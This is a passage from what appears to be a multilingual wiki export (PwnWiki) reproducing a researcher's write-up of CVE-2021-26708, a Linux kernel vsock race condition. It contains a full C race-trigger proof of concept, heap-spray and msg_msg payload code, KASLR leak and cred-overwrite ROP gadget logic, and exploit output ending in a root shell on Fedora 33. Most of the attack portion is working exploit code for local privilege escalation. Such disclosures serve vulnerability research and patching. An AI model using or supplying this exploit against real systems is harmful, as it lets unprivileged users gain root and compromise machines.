mmap () configura userfaultfd () en el área de memoria spray_data como la última parte;
Inicie un pthread separado para manejar los eventos de userfaultfd ();
Inicie 127 subprocesos para setxattr () &amp; userfaultfd () heap spray en msg_msg, y cuélguelos en thread_barrier;
Obtenga la dirección del kernel del msg_msg original:
Competencia condicional en enchufes virtuales;
Después del segundo connect (), espere 35 microsegundos en el ciclo ocupado;
Llame a msgsnd () para crear una cola de mensajes separada; después de la corrupción de la memoria, el objeto msg_msg se coloca en la posición virtio_vsock_sock;
Analice el registro del kernel y guarde la dirección del kernel de msg_msg de la advertencia del kernel (registro RCX);
Al mismo tiempo, guarde la dirección del kernel de vsock_sock del registro RBX;
Utilice el msg_msg dañado para realizar una liberación arbitraria del msg_msg original:
Utilice 4 bytes de la dirección original msg_msg como SO_VM_SOCKETS_BUFFER_SIZE para lograr la corrupción de la memoria;
Competencia condicional en enchufes virtuales;
Llame a msgsnd () inmediatamente después del segundo connect (); msg_msg se coloca en la posición de virtio_vsock_sock para lograr la destrucción;
El puntero de seguridad del msg_msg ahora destruido almacena la dirección del msg_msg original (del paso 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

Si la corrupción de la memoria msg_msg.security del subproceso setsockopt () ocurre durante el procesamiento de msgsnd (), la verificación de permisos de SELinux falla;
En este caso, msgsnd () devuelve -1, y el msg_msg dañado se destruye; liberar msg_msg.security puede liberar el msg_msg original;
Sobrescriba el msg_msg original con una carga útil controlable:
Después de que msgsnd () falle, la vulnerabilidad llamará a pthread_barrier_wait () y llamará a 127 pthreads para la pulverización del montón;
Estos pthreads ejecutan la carga útil de setxattr ();
El msg_msg original se sobrescribe con datos controlables y el puntero msg_msg.next almacena la dirección del objeto vsock_sock;

[[File:T0140baae964febb059.png | 600px ]]

Lea el contenido del objeto del kernel vsock_sock en el espacio del usuario recibiendo el mensaje de la cola de mensajes que almacena el msg_msg sobrescrito:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

== Encuentra el objetivo del ataque ==

Estos son los puntos que encontré:
1. La caché de bloques dedicada, como PINGv6 y sock_inode_cache, tienen muchos indicadores de objetos.
2. El puntero struct mem_cgroup * sk_memcg está en el desplazamiento 664 en vsock_sock.sk. La estructura mem_cgroup se asigna en la caché de bloques kmalloc-4k.
3. El puntero de propietario const struct cred * está en el desplazamiento 840 de vsock_sock.sk y almacena la dirección de la credencial que se puede sobrescribir para escalar permisos.
4. El puntero de función void (* sk_write_space) (struct sock *) está en el desplazamiento 688 de vsock_sock.sk y se establece en la dirección de la función del kernel sock_def_write_space (). Se puede utilizar para calcular el desplazamiento de KASLR.

Así es como la vulnerabilidad extrae estos indicadores de la memoria:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

== Implementar Use-after-free en sk_buff ==

El búfer relacionado con la red en el kernel de Linux está representado por struct sk_buff Hay skb_shared_info y destructor_arg en este objeto, que se pueden usar para controlar el flujo de secuestro. Los datos de red y skb_shared_info se colocan en el mismo bloque de memoria del núcleo al que apunta sk_buff.head. Por lo tanto, la creación de un paquete de red de 2800 bytes en el espacio del usuario hará que skb_shared_info se asigne al caché de bloques kmalloc-4k, al igual que el objeto mem_cgroup.

Construí los siguientes pasos:

1. Utilice sockets (AF_INET, SOCK_DGRAM, IPPROTO_UDP) para crear un socket de cliente y 32 sockets de servidor

2. Prepare un búfer de 2800 bytes en el espacio de usuario y use 0x42 para memset ()

3. Utilice sendto () para enviar este búfer desde el socket del cliente a cada socket del servidor para crear objetos sk_buff en kmalloc-4k. Use `sched_setaffinity () en cada CPU disponible

4. Realice un proceso de lectura arbitrario en vsock_sock

5. Calcule la posible dirección del kernel sk_buff como sk_memcg más 4096 (el siguiente elemento de kmalloc-4k)

6. Realice lecturas arbitrarias en esta posible dirección sk_buff

7. Si encuentra 0x42424242424242lu en la ubicación de los datos de red, busque el sk_buff real y vaya al paso 8. De lo contrario, agregue 4096 a la posible dirección sk_buff y vaya al paso 6

8. Ejecute setxattr () &amp; userfaultfd () heap spray de 32 pthreads en sk_buff y cuélguelos en pthread_barrier

9. Libere arbitrariamente la dirección del kernel sk_buff

10. Llame a pthread_barrier_wait (), ejecute 32 setxattr () para cubrir los pthreads de heap spray de skb_shared_info

11. Utilice recv () para recibir mensajes de red desde el socket del servidor.

== Escribir libremente a través de skb_shared_info ==

La siguiente es una carga útil válida que sobrescribe el objeto sk_buff:

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info reside en los datos de inyección, exactamente en el desplazamiento SKB_SHINFO_OFFSET, que es 3776 bytes. El puntero skb_shared_info.destructor_arg almacena la dirección de struct ubuf_info. Debido a que se conoce la dirección del kernel del sk_buff atacado, se puede crear un ubuf_info falso en MY_UINFO_OFFSET en el búfer de la red. El siguiente es el diseño de una carga útil válida:

[[File:T0185ccbf9f025c74da.png  | 600px]]

Hablemos de la devolución de llamada destructor_arg:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

Como no pude encontrar un dispositivo que pudiera satisfacer mis necesidades en vmlinuz-5.10.11-200.fc33.x86_64, lo investigué y lo construí yo mismo.

El puntero de la función de devolución de llamada almacena la dirección de un dispositivo ROP, RDI almacena el primer parámetro de la función de devolución de llamada, que es la dirección de ubuf_info en sí, y RDI + 8 apunta a ubuf_info.desc. el gadget mueve ubuf_info.desc a RDX. Ahora RDX contiene el ID de usuario efectivo y la dirección de ID de grupo menos un byte. Este byte es muy importante: cuando el dispositivo escribe el mensaje 1 desde RSI en la memoria apuntada por RDX, el uid y el gid efectivos se sobrescribirán con cero. Repita el mismo proceso hasta que los privilegios se actualicen a root. El flujo de salida de todo el proceso es el siguiente:
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

== Video ==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


== Referencia ==
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>nauen8lbmq970r7omx2g1xvzv0p1tlo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/he</title>
    <ns>0</ns>
    <id>2249</id>
    <revision>
      <id>2679</id>
      <timestamp>2021-05-06T04:07:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "ליבת לינוקס CVE-2021-26708 לפני 5.10.13 העלאת פגיעות הרשאות"</comment>
      <origin>2679</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="27244" sha1="ix5uuc7aw8hxct9s3agvnjfgr56gy0n" xml:space="preserve">&lt;languages  /&gt;
== פגיעות ==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這些漏洞是由&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;中的錯誤鎖定引起的條件競爭。這些條件競爭是在2019年11月添加VSOCK多傳輸支持的提交中隱式引入的，並被合併到Linux內核5.5-rc1版本中。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;和&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;在所有主要的GNU/Linux發行版中都作為內核模塊提供。當你為AF_VSOCK域創建一個套接字時，這些易受攻擊的模塊會自動加載。
&lt;/div&gt;
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;AF_VSOCK&lt;/code&gt;套接字的創建對非特權用戶來說是可用的，並不需要用戶名空間。
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==內存破壞==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面詳細介紹CVE-2021-26708的利用，利用了&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;中的條件競爭，復現需要兩個線程，第一個線程調用&lt;code&gt;setsockopt()&lt;/code&gt;：
&lt;/div&gt;
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
第二個線程在&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;試圖獲取套接字鎖時改變虛擬套接字傳輸，通過重新連接虛擬套接字實現：
&lt;/div&gt;
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
為了處理虛擬套接字的&lt;code&gt;connect()&lt;/code&gt;，內核執行調用&lt;code&gt;vsock_assign_transport()&lt;/code&gt;的&lt;code&gt;vsock_stream_connect()&lt;/code&gt;。這個函數包含如下代碼：
&lt;/div&gt;
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;/div&gt;
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡，vvs是指向內核內存的指針，它已經在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被釋放。 &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小為64字節，位於kmalloc-64塊緩存中。 buf_alloc字段類型為u32，位於偏移量40。 &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。 *val的值由攻擊者控制，它的四個最不重要的字節被寫入釋放的內存中。
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==模糊測試==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/div&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/div&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==四字節的力量==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/div&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==內核信息洩露==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/div&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==實現任意讀==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/div&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/div&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
